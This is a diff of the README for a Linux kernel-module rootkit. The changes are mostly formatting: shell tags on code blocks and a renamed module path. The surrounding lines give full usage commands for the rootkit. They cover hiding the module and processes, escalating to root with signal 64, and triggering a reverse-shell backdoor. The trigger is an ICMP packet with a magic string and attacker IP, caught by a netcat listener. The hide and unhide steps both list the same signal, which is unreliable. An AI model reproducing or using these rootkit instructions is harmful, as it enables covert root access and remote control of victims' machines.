@@ -10,7 +10,7 @@ This simple kernel module rootkit overwrites linux system calls to hide itself, 
 
 - Hide/Show rootkit in the list of loaded modules (`$ lsmod`)
   
-  ```
+  ```sh
   $ kill -63 1
   ```
   
@@ -18,19 +18,19 @@ This simple kernel module rootkit overwrites linux system calls to hide itself, 
 
 - Become root
   
-  ```
+  ```sh
   $ kill -64 1
   ```
 
 - Hide process with pid
 
-  ```
+  ```sh
   $ kill -62 <pid>
   ```
 
 - Unhide process with pid
 
-  ```
+  ```sh
   $ kill -62 <pid>
   ```
 
@@ -40,13 +40,13 @@ It also hides every file and directory with prefix `rootk_`.
 
 On attacker machine start netcat listener on some port:
 
-```
+```sh
 $ nc -lnvp <port>
 ```
 
 Send ICMP ping to victim:
 
-```
+```sh
 $ nping --icmp -c 1 -dest-ip <victim-ip> --data-string 'xCs!w@ <attacker-ip> <port>'
 ```
 
@@ -54,15 +54,15 @@ $ nping --icmp -c 1 -dest-ip <victim-ip> --data-string 'xCs!w@ <attacker-ip> <po
 
 Compile module and backdoor:
 
-```
+```sh
 $ make
 $ make install
 ```
 
 Load module:
 
-```
-$ sudo insmod rk.ko
+```sh
+$ sudo insmod build/rootkit.ko
 ```
 
 ### Remove module:
@@ -71,6 +71,6 @@ Make sure the module is visible in `lsmod`. To toggle visibility run `kill -63 1
 
 Then you can remove it using:
 
-```
-$ sudo rmmod rk.ko
+```sh
+$ sudo rmmod rootkit.ko
 ```
